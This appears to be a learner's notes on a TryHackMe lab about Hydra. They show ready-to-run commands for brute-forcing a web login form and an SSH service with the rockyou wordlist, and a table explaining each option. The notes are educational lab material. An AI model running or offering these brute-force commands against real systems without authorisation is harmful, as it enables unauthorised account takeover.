# Hydra

**Link:** https://tryhackme.com/room/hydra
**Path:** Level 2 - Tooling
**Difficulty:** Easy
**Date:** 01 July 2026

## Concepts & Tools Covered
- Hydra (password brute-forcing tool)
- SSH brute force attack
- Web form (HTTP POST) brute force attack
- Wordlists (rockyou.txt)

## Approach

Used Hydra to brute force login credentials for both a web form and SSH service. First identified the login page structure (POST method, form fields), then used Hydra with rockyou.txt wordlist to find the correct password for the target user (molly).

## Key Commands

```bash
# Web Form (HTTP POST) brute force
hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

# SSH brute force
hydra -l molly -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> -t 4 ssh
```

## Key Options Explained

| Option | Description |
|--------|-------------|
| -l | Specifies the username |
| -P | Path to password wordlist |
| -t 4 | Number of parallel threads |
| http-post-form | Specifies POST form attack type |
| ^USER^ | Placeholder replaced by username |
| ^PASS^ | Placeholder replaced by each password |
| F=incorrect | String shown on failed login |
| -V | Verbose output (shows each attempt) |

## Findings / Screenshots

(Add screenshots here — web form brute force output, SSH brute force output, flags captured)

## What I Learned

Hydra is a powerful online password brute-forcing tool. Different services require different syntax — SSH is straightforward, but web forms require understanding the login request structure (POST fields and failure response string) before running the attack.
